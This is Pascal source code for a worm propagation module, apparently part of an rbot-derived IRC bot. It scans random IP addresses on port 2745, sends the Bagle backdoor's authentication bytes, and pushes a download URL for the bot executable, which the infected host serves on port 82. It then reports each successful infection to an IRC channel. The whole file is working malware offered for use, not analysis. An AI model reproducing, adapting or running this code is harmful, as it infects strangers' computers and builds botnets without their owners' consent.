{ ported from rbot by p0ke. }
Unit Bagle_Spreader1;

Interface

{$DEFINE Stats}

uses
  Windows, Winsock{$IFDEF Stats}, stats_spreader{$ENDIF};
  
Procedure StartBeagle1(NumberOfThreads: Word);

Implementation

type
  TIPs             = ARRAY[0..10] OF STRING;

  spreader_beagle1 = class(tobject)
  private
    Auth: String; //  = #$43#$FF#$FF#$FF#$30#$30#$30#$01#$0A#$1F#$2B#$28#$2B#$A1#$32#$01;
  public
    Procedure Start;
end;

Var
  IPs : TIPs;

function StrtoInt(const S: string): integer; var
E: integer; begin Val(S, Result, E); end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

function RandIP: String; Begin Randomize; Result :=
IntToStr(Random(255))+'.'+IntToStr(Random(255))+'.'+
IntToStr(Random(255))+'.'+IntToStr(Random(255)); End;

PROCEDURE GetIPs(VAR IPs:TIPS;VAR NumberOfIPs:BYTE);
TYPE
  TaPInAddr = ARRAY [0..10] OF PInAddr;
  PaPInAddr = ^TaPInAddr;
VAR
  phe       : PHostEnt;
  pptr      : PaPInAddr;
  Buffer    : ARRAY [0..63] OF Char;
  I         : Integer;
  GInitData : TWSAData;
BEGIN
  WSAStartup($101,GInitData);
  GetHostName(Buffer,SizeOf(Buffer));
  phe:=GetHostByName(Buffer);
  IF phe=NIL THEN Exit;
  pPtr:=PaPInAddr(phe^.h_addr_list);
  I:=0;
  WHILE pPtr^[I]<>NIL DO BEGIN
    IPs[I]:=inet_ntoa(pptr^[I]^);
    NumberOfIPs:=I;
    Inc(I);
  END;
  WSACleanup;
END;

Function GetLocalIP: String;
VAR
  NumberOfIPs : Byte;
  I           : Byte;
  IP          : STRING;
Begin
  GetIPs(IPs,NumberOfIPs);
  FOR I:=0 TO NumberOfIPs DO
    IP:=IPs[I];
  Result := IP;
End;

Procedure spreader_beagle1.Start;
Var
  Buffer	:Array[0..8] Of Char;
  BotFile	:String;
  
  WSAData	:TWSAData;
  Success	:Bool;
  
  Sock		:TSocket;
  Addr		:TSockAddrIn;

  IP            :String;
Begin
  Success := False;
  Auth := #$43#$FF#$FF#$FF#$30#$30#$30#$01#$0A#$1F#$2B#$28#$2B#$A1#$32#$01;

  WSAStartUp(MakeWord(1,1), WSAData);
  Sock := Socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  IP := RandIP;

  Addr.sin_family := AF_INET;
  Addr.sin_port	  := hTons(2745);
  Addr.sin_addr.s_addr := inet_addr(pchar(IP));
  
  if (connect(sock, addr, sizeof(addr)) = error_success) Then
  Begin
    if (send(sock, auth[1], length(auth), 0) <> socket_error) then
      if (recv(sock, buffer, 8, 0) <> socket_error) then
      begin
        Randomize;
        BotFile := 'http://' + GetLocalIP + ':82/Pinguin.exe' +
                   inttostr(random(9)) + '.exe';
        if (send(sock, botfile[1], length(botfile), 0) <> socket_error) then success := true;
      end;
  End;
  
  CloseSocket(Sock);
  WSACleanUp;
  
  if (success) then
  begin
    {$IFDEF Stats}
      Inc(Beagle1_Infect);
      Bot.SendRAW('PRIVMSG '+Bot.Channel+' :[b1:'+IP+']'#10);
    {$ENDIF}
  end;
End;

PROCEDURE StartRandomThread;
VAR
  Beagle : spreader_beagle1;
BEGIN
  Beagle := spreader_beagle1.Create;
  Beagle.Start;
END;

Procedure StartBeagle1(NumberOfThreads: Word);
Var
  ThreadID	:Dword;
  I		:integer;
Begin
  For i := 0 To (NumberOfThreads-1) Do
    CreateThread(nil, 0, @StartRandomThread, nil, 0, threadid);
End;

end.